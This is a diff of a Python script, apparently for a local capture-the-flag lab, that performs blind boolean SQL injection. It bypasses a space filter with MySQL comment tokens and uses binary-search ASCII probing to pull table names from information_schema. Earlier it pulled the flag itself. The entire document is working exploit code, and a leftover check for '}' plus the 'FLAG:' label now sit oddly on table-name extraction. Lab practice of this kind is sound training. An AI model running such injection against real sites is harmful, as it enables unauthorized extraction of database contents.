@@ -3,8 +3,8 @@
 # 用法：python blind_boolean_nospace.py
 import urllib.request, urllib.parse
 
-URL = "http://localhost:8083/si5b/"
-TABLE = "flag5b_table"
+URL = "http://localhost:8083/si5/"
+table_name = ""
 
 def ask(cond):
     # 注意：空格全部换成 /**/（MySQL 把注释当空白解析，但字面不是空白字符）
@@ -12,19 +12,19 @@ def ask(cond):
     r = urllib.request.urlopen(URL + "?id=" + urllib.parse.quote(payload)).read().decode()
     return "查询到了" in r
 
-flag = ""
+
 for pos in range(1, 60):
     lo, hi = 32, 127
     while lo < hi:
         mid = (lo + hi) // 2
-        cond = "ascii(substr((select/**/flag/**/from/**/%s),%d,1))>%d" % (TABLE, pos, mid)
+        cond = "ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()),%d,1))>%d" % (pos, mid)
         if ask(cond):
             lo = mid + 1
         else:
             hi = mid
     c = chr(lo)
-    flag += c
-    print(flag)
+    table_name += c
+    print(table_name)
     if c == "}":
         break
-print("FLAG:", flag)
+print("FLAG:", table_name)
